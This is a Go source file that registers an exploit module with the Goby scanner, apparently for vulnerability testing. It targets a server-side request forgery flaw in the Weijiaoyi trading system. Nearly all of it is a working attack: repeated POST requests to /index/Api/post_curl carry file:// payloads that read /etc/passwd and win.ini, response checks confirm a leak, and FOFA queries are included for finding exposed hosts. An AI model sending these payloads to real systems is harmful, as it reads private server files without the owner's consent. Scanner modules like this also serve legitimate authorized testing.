package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weijiaoyi post_curl SSRF",
    "Description": "Micro disk trading system is a micro trading system, which is used to trade gold, currency, digital currency and other types of systems. Because the system code filtering is not rigorous, there are SSRF loopholes in the system",
    "Impact": "Weijiaoyi post_curl SSRF",
    "Recommendation": "<p>Limit the range of incoming protocol and request addresses</p>",
    "Product": "weijiaoyi",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "微盘交易系统 post_curl SSRF 漏洞",
            "Description": "<p>微盘交易系统是一个微型的交易系统，用于买卖黄金、货币和数字货币等类型的系统。<br></p><p>微盘交易系统代码过滤不严谨，导致系统存在SSRF漏洞。攻击者可利用该漏洞读取任意文件，造成严重信息泄露。<br></p>",
            "Impact": "<p>微盘交易系统代码过滤不严谨，导致系统存在SSRF漏洞。攻击者可利用该漏洞读取任意文件，造成严重信息泄露。<br></p>",
            "Recommendation": "<p>厂商暂未发布漏洞补丁，请及时关注源码网站：<a href=\"https://github.com/clearlive/weipan21\">https://github.com/clearlive/weipan21</a><br></p>",
            "Product": "微盘交易系统",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Weijiaoyi post_curl SSRF",
            "Description": "Micro disk trading system is a micro trading system, which is used to trade gold, currency, digital currency and other types of systems. Because the system code filtering is not rigorous, there are SSRF loopholes in the system",
            "Impact": "Weijiaoyi post_curl SSRF",
            "Recommendation": "<p>Limit the range of incoming protocol and request addresses<br></p>",
            "Product": "weijiaoyi",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "body=\"ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required\" || body=\"/static/index/js/lk/order.js\"",
    "GobyQuery": "body=\"ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required\" || body=\"/static/index/js/lk/order.js\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-06-05",
    "References": [
        "https://xz.aliyun.com/t/8263#toc-2"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/index/Api/post_curl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "url=file:///etc/passwd&data[]="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ":/bin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index/Api/post_curl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "url=file://c:\\\\windows\\\\win.ini&data[]="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[extensions]",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/index/Api/post_curl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "url=file:///etc/passwd&data[]="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ":/bin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index/Api/post_curl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "url=file://c:\\\\windows\\\\win.ini&data[]="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[extensions]",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "URI",
            "type": "createSelect",
            "value": "file:///etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
